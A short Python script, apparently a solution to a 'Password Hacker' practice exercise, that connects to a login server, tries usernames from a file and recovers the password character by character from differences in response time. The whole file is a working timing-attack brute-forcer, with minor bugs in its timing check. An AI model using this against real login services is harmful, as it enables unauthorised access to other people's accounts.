import socket
import json
import time
from datetime import datetime
from sys import argv
from string import ascii_letters, digits



options = ascii_letters + digits
host = argv[1]
port = int(argv[2])


def password_search(log, pass_):
    while True:
        for letter in options:
            message_2 = json.dumps({"login": log, "password": pass_ + letter}).encode()
            client_socket.send(message_2)
            start = datetime.now()
            recv_2 = json.loads(client_socket.recv(128).decode())
            end = datetime.now()
            time_difference = end - start
            if time_difference.microseconds >= 1000 and recv['result'] == "Wrong password!":
                pass_ += letter
            if recv_2['result'] == 'Connection success!':
                print(json.dumps({'login': login, 'password': pass_ + letter}))
                return


with socket.socket() as client_socket:
    client_socket.connect((host, int(argv[2])))
    with open('/Users/antonzemtsov/PycharmProjects/Password Hacker/Password Hacker/task/hacking/logins.txt', 'r') as f:
        lines = f.read().split('\n')
        password = ''
        for login in lines:
            message = json.dumps({
                "login": login,
                "password": password
            }).encode()
            client_socket.send(message)
            recv = json.loads(client_socket.recv(128).decode())
            if recv == {"result": "Wrong password!"}:
                password_search(login, password)
                break


